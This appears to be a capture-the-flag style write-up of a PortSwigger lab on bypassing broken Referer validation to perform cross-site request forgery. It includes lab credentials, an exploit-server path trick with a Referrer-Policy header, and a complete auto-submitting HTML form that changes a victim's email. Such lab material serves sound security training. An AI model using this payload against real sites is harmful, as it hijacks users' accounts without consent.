# [Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

## Lab

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

server check if Referer header containing `0a38002c04ca4f89c0261cd6001f00d5.web-security-academy.net` or not to prevent csrf

## Solutions

exploit server:

file:

```text
/id.web-security-academy.net/
```

header:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

- if header doesn't contain `Referrer-Policy: unsafe-url`, the referer header doesn't include `/id.web-security-academy.net/`

Body:

```html
<html>
    <body>
        <form action="https://id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
